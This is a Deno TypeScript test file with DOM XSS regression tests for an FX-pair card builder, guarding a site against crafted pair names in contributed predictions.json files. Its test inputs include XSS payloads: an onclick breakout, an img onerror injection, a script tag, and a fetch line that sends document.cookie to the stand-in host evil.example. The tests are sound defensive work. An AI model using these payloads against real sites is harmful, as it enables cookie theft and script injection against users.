// DOM XSS regression tests for the FX-pair card builder.
// Australian English: these tests verify that values originating from
// `predictions.json` are treated as text (not HTML and not JS source) when
// rendered into the FX-pair card. They guard issue #12: a malicious
// contributor must not be able to land an XSS payload by submitting a
// crafted `pair.pair` value in a PR that adds `docs/<date>/predictions.json`.
//
// Date: 21-May-2026

// Minimal hand-rolled DOM mock. We avoid deno-dom because we need full
// control over event dispatch — deno-dom does not fire registered click
// listeners synchronously. The mock only implements the surface the card
// builder uses (createElement, textContent, className, classList.add,
// appendChild, addEventListener) plus a `click()` helper that invokes the
// registered click listeners.

interface MockNode {
  tagName: string;
  _attrs: Record<string, string>;
  _children: MockNode[];
  _listeners: Record<string, ((ev: unknown) => void)[]>;
  _classes: Set<string>;
  _textContent: string;
  className: string;
  classList: { add: (...cls: string[]) => void };
  textContent: string;
  appendChild: (child: MockNode) => MockNode;
  addEventListener: (type: string, fn: (ev: unknown) => void) => void;
  click: () => void;
  querySelector: (selector: string) => MockNode | null;
  outerHTML: string;
}

function createElement(tag: string): MockNode {
  const node = {
    tagName: tag.toUpperCase(),
    _attrs: {} as Record<string, string>,
    _children: [] as MockNode[],
    _listeners: {} as Record<string, ((ev: unknown) => void)[]>,
    _classes: new Set<string>(),
    _textContent: "",
  } as unknown as MockNode;

  Object.defineProperty(node, "className", {
    get() {
      return Array.from(node._classes).join(" ");
    },
    set(v: string) {
      node._classes = new Set(String(v).split(/\s+/).filter(Boolean));
    },
  });

  node.classList = {
    add: (...cls: string[]) => {
      for (const c of cls) node._classes.add(c);
    },
  };

  Object.defineProperty(node, "textContent", {
    get() {
      if (node._children.length === 0) return node._textContent;
      return node._children.map((c) => c.textContent).join("");
    },
    set(v: string) {
      node._textContent = String(v);
      node._children = [];
    },
  });

  node.appendChild = (child: MockNode) => {
    node._children.push(child);
    return child;
  };

  node.addEventListener = (type: string, fn: (ev: unknown) => void) => {
    (node._listeners[type] ||= []).push(fn);
  };

  node.click = () => {
    for (const fn of node._listeners["click"] || []) fn({ type: "click" });
  };

  node.querySelector = (selector: string): MockNode | null => {
    // Very small subset: ".class" or "tagName".
    const match = (n: MockNode): boolean => {
      if (selector.startsWith(".")) {
        return n._classes.has(selector.slice(1));
      }
      return n.tagName === selector.toUpperCase();
    };
    const walk = (n: MockNode): MockNode | null => {
      for (const child of n._children) {
        if (match(child)) return child;
        const found = walk(child);
        if (found) return found;
      }
      return null;
    };
    return walk(node);
  };

  // Serialise the subtree to an HTML-ish string. Text content is HTML-encoded
  // so the test can assert on what would actually be parsed by a browser.
  Object.defineProperty(node, "outerHTML", {
    get() {
      const encode = (s: string) =>
        s
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#39;");
      const serialise = (n: MockNode): string => {
        const tag = n.tagName.toLowerCase();
        const attrs: string[] = [];
        const classStr = Array.from(n._classes).join(" ");
        if (classStr) attrs.push(`class="${encode(classStr)}"`);
        for (const [k, v] of Object.entries(n._attrs)) {
          attrs.push(`${k}="${encode(v)}"`);
        }
        const attrStr = attrs.length ? " " + attrs.join(" ") : "";
        const body = n._children.length
          ? n._children.map(serialise).join("")
          : encode(n._textContent);
        return `<${tag}${attrStr}>${body}</${tag}>`;
      };
      return serialise(node);
    },
  });

  return node;
}

const mockDocument = { createElement };

// Load the production safe-card builder and capture the exported global.
async function loadBuildFXPairCard(): Promise<
  (
    pair: { pair: string; currentRate: number; predictions: unknown[] },
    doc: { createElement: (tag: string) => MockNode },
    formatters: {
      formatCurrency: (v: number) => string;
      formatPercentage: (v: number | null) => string;
      calculateBestFitSlope: (preds: unknown[]) => number | null;
    },
    onSelect: (pairName: string) => void,
  ) => MockNode
> {
  const src = await Deno.readTextFile(
    new URL("../docs/safe-card.js", import.meta.url),
  );
  // deno-lint-ignore no-explicit-any
  const scope: any = {};
  const factory = new Function(
    "globalThis",
    "window",
    src + "\nreturn globalThis.buildFXPairCard;",
  );
  return factory(scope, scope);
}

const formatters = {
  formatCurrency: (v: number) => String(v),
  formatPercentage: (v: number | null) => v === null ? "N/A" : String(v),
  calculateBestFitSlope: () => null,
};

Deno.test("buildFXPairCard does not emit an inline onclick attribute", async () => {
  const buildFXPairCard = await loadBuildFXPairCard();
  const malicious = "');alert(document.cookie);//";
  const pair = { pair: malicious, currentRate: 1.0, predictions: [] };
  const col = buildFXPairCard(pair, mockDocument, formatters, () => {});
  const html = col.outerHTML;
  if (/\bonclick\s*=/i.test(html)) {
    throw new Error(
      "FX pair card must not include an inline onclick= attribute (XSS risk)",
    );
  }
});

Deno.test("buildFXPairCard renders the pair name only as encoded text", async () => {
  const buildFXPairCard = await loadBuildFXPairCard();
  const malicious = "<img src=x onerror=alert(1)>";
  const pair = { pair: malicious, currentRate: 1.0, predictions: [] };
  const col = buildFXPairCard(pair, mockDocument, formatters, () => {});
  const html = col.outerHTML;
  if (html.includes("<img")) {
    throw new Error(
      "Pair name must be rendered as encoded text, never as raw HTML",
    );
  }
  // The encoded form should be present.
  if (!html.includes("&lt;img src=x onerror=alert(1)&gt;")) {
    throw new Error(
      "Expected the malicious pair name to appear as HTML-encoded text",
    );
  }
});

Deno.test("buildFXPairCard click handler receives the literal pair name", async () => {
  const buildFXPairCard = await loadBuildFXPairCard();
  const malicious = "');fetch('https://evil.example/?c='+document.cookie);//";
  const pair = { pair: malicious, currentRate: 1.0, predictions: [] };
  let received: string | null = null;
  const col = buildFXPairCard(
    pair,
    mockDocument,
    formatters,
    (name: string) => {
      received = name;
    },
  );
  const card = col.querySelector(".fx-pair-card");
  if (!card) throw new Error("Expected .fx-pair-card to exist in the column");
  card.click();
  if (received !== malicious) {
    throw new Error(
      `Click handler should receive the raw pair name; got ${
        JSON.stringify(received)
      }`,
    );
  }
});

Deno.test("buildFXPairCard places the pair name as h5 textContent", async () => {
  const buildFXPairCard = await loadBuildFXPairCard();
  const malicious = "<script>alert(1)</script>";
  const pair = { pair: malicious, currentRate: 1.0, predictions: [] };
  const col = buildFXPairCard(pair, mockDocument, formatters, () => {});
  const h5 = col.querySelector("h5");
  if (!h5) throw new Error("Expected an <h5> heading in the card");
  if (h5.textContent !== malicious) {
    throw new Error(
      `h5 textContent should equal the raw pair name; got ${
        JSON.stringify(h5.textContent)
      }`,
    );
  }
});

Deno.test("populateFXPairsList in docs/index.js uses the safe card builder", async () => {
  // Source-level guard against regression: the old implementation
  // string-concatenated pair.pair into an innerHTML template literal with an
  // inline onclick=. This regression test ensures the unsafe pattern does not
  // come back.
  const src = await Deno.readTextFile(
    new URL("../docs/index.js", import.meta.url),
  );
  // Locate the populateFXPairsList method body.
  const idx = src.indexOf("populateFXPairsList()");
  if (idx === -1) {
    throw new Error("Could not find populateFXPairsList in docs/index.js");
  }
  // Read the next ~3000 chars — enough to cover the whole method.
  const slice = src.slice(idx, idx + 3000);
  if (/onclick="[^"]*\$\{pair\.pair\}/.test(slice)) {
    throw new Error(
      "populateFXPairsList still string-interpolates pair.pair into an inline onclick= attribute (XSS regression)",
    );
  }
  if (!slice.includes("buildFXPairCard(")) {
    throw new Error(
      "populateFXPairsList should delegate to the safe buildFXPairCard helper",
    );
  }
});
